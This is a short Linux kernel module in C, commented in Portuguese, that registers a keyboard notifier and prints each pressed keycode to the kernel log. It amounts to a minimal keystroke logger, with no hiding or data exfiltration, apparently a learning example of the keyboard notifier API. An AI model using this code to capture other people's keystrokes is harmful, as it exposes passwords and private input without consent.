#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/vt_kern.h>

static int capture_key_event(struct notifier_block *nb, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    // Verifica se é um evento de tecla pressionada
    if (code == KBD_KEYCODE && param->down) {
        // Captura a tecla pressionada
        int keycode = param->value;

        // Exemplo de impressão no kernel log
        printk(KERN_INFO "Tecla pressionada: %d\n", keycode);
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = capture_key_event
};

static int __init my_module_init(void)
{
    // Registra a função de tratamento para eventos de teclado
    register_keyboard_notifier(&nb);

    printk(KERN_INFO "Módulo do kernel carregado\n");
    return 0;
}

static void __exit my_module_exit(void)
{
    // Desregistra a função de tratamento para eventos de teclado
    unregister_keyboard_notifier(&nb);

    printk(KERN_INFO "Módulo do kernel descarregado\n");
}

module_init(my_module_init);
module_exit(my_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("barbie");
MODULE_DESCRIPTION("Módulo de kernel para capturar informações do teclado");

